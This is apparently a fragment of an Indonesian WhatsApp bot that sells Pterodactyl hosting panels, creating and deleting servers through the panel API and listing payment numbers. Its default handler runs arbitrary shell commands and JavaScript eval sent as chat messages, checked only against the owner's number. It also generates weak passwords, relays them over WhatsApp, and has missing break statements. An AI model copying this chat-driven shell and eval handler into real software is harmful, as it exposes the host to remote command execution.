case "cp1gbv5": case "cp2gbv5": case "cp3gbv5": case "cp4gbv5": case "cp5gbv5": case "cp6gbv5": case "cp7gbv5": case "cp8gbv5": case "cp9gbv5": case "cp10gbv5": case "cpunliv5": {
if (!isOwner && !isPremium) return reply(msg.owner)
if (global.panel2 == null) return reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv5") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv5") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv5") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv5") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv5") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv5") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv5") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv5") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv5") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv5") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isOwner && !isPremium) return reply(msg.owner)
let username = global.panel2[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = global.panel2[1]
await reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${orang.split("@")[0]}`)
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
global.panel2 = null
}
break
case "listpanel": case "listp": case "listserver": {
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: messageText
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Buat Server Panel\",\"title\":\"Buat Panel\",\"id\":\".cpanel\"}" 
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Hapus Server Panel\",\"title\":\"Hapus Panel\",\"id\":\".delpanel\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "delpanel": {
let kontol = new Array()
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status
let namanya = `${s.name}`
let idnya = `${s.id} ⚡`
let ramnya = `${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}`
let cpunya = `${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`
let disknya = `${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}`
await kontol.push({ 
header: `ID Server ${idnya}`, title: `Nama Server : ${namanya}`, description: `Ram ${ramnya} | Cpu ${cpunya} | Disk ${disknya}`, id: `.respon_delpanel ${idnya}`})
}
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: '\nSilahkan Pilih *Server Panel* Yang Ingin Kamu Hapus, Untuk Melihat Lebih Detail Info Server Ketik *.listpanel*'
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ title : "Klik Disini",
sections: [{
title: "Total Server Panel : ${res.meta.pagination.count} Server",
rows: ${JSON.stringify(kontol)}
}]}`
}, 
{
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"List Server Panel\",\"title\":\"List Panel\",\"id\":\".listpanel\"}" 
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "respon_delpanel": {
if (!isOwner && !isPremium) return reply(msg.owner)
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("idservernya\n\nuntuk melihat id server ketik *.listpanel*"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return reply("*ID Server/User* Tidak Ditemukan")
reply(`*Berhasil Menghapus Akun Panel ✅*
Nama Server : *${capital(sections[0])}*`)
}
break
case "sendpayment": case "payment": case "pay": case "listpayment": {
if (!isOwner) return reply(msg.owner)
let teksnya = `
Silahkan Pilih Payment Pembayaran Yang Tersedia Di Bawah Ini`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Payment", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Dana", "title": "Dana Payment", "id": ".danapay" }, 
{ "header": "Ovo", "title": "Ovo Payment", "id": ".ovopay" }, 
{ "header": "Gopay", "title": "Gopay Payment", "id": ".gopaypay" }, 
{ "header": "QRIS", "title": "QRIS Payment", "id": ".qrispay" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qpayment}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "ambilq": {
let jsonData = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2)
reply(jsonData)
}
break
case "danapay": {
if (global.dana == false) return reply('Payment Dana Tidak Tersedia')
let teks = `
*Nomor Dana :*
${global.dana}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
anggazyy.sendText(m.chat, teks, qchanel)
}
break
case "ovopay": {
if (global.ovo == false) return reply('Payment Ovo Tidak Tersedia')
let teks = `
*Nomor Ovo :*
${global.ovo}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
anggazyy.sendText(m.chat, teks, qchanel)
}
break
case "gopaypay": {
if (global.gopay == false) return reply('Payment Gopay Tidak Tersedia')
let teks = `
*Nomor Gopay :*
${global.gopay}

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
anggazyy.sendText(m.chat, teks, qchanel)
}
break
case "qrispay": {
if (global.qris == false) return reply('Payment Qris Tidak Tersedia')
reply('Memproses Mengambil QRIS, Tunggu Sebentar . . .')
let teks = `
*Untuk Pembayaran Melalui QRIS All Payment, Silahkan Scan Foto QRIS Diatas Ini*

*Note :*
Demi Keamanan Bersama, Buyyer Wajib Mengirim Bukti Pembayaran Agar Tidak Terjadi Hal Yang Tidak Di Inginkan!
`
anggazyy.sendMessage(m.chat, {image: global.qris, caption: teks}, {quoted: qchanel})
}
break
case "jadibot":{
  if (isGroup) return reply("Features Used Only For Private Chat!")
  //if (!isReseller) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  jadibot(anggazyy, m, from)
}
break
case "stopjadibot":{
  if (isGroup) return reply("Features Used Only For Private Chat!")
  //if (!isReseller) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  stopjadibot(anggazyy, from)
}
break
case "listjadibot":{
  if (isGroup) return reply("Features Used Only For Private Chat!")
  //if (!isReseller) return reply("Kamu Belum Menjadi User Premium Silahkan Beli Premium Ke Owner Dengan Ketik .owner")
  listjadibot(anggazyy, m)
}
case "cpanel3": case "addpanel3": case "buatpanel3": {
if (!jangan) return reply("Group Belum Terdaftar")
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama,6283XXX"))
if (!text.split(",")) return reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await anggazyy.onWhatsApp(ceknya)
if (!check[0].exists) return reply("Nomor Buyyer Tidak Valid!")
global.panel3 = [buyyer, client]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunliv3" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gbv3" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gbv3" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gbv3" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gbv3" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gbv3" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gbv3" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gbv3" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gbv3" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gbv3" }, 
{ "header": "Ram 10GB", "title": "Ram 10GB | CPU 220%", "id": ".cp10gbv3" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cp1gbv3": case "cp2gbv3": case "cp3gbv3": case "cp4gbv3": case "cp5gbv3": case "cp6gbv3": case "cp7gbv3": case "cp8gbv3": case "cp9gbv3": case "cp10gbv3": case "cpunliv3": {
if (global.panel3 == null) return reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv3") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv3") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv3") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv3") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv3") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv3") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv3") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv3") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv3") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv3") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!jangan) return reply("Grup Belum Terdaftar")
let username = global.panel3[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
await reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${global.panel3[1].split('@')[0]}`)
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await anggazyy.relayMessage(global.panel3[1], msgii.message, { 
messageId: msgii.key.id 
})
global.panel3 = null
}
break

     case 'delgc':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply("Khusus Grup")
var ini = pler.indexOf(m.chat)
pler.splice(ini, 1)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} Success Not Active anggazyy - Official✅`)
break
case 'addgc':
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply("Khusus Grup")
pler.push(m.chat)
fs.writeFileSync('./all/database/idgrup.json', JSON.stringify(pler))
reply(`${command} Success Active To Reseller Panel  anggazyy - Official✅`)
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return anggazyy.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return anggazyy.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
anggazyy.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
anggazyy.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return anggazyy.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return anggazyy.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
anggazyy.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}

Command From : ${m.sender.split("@")[0]}`}, {quoted: m})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})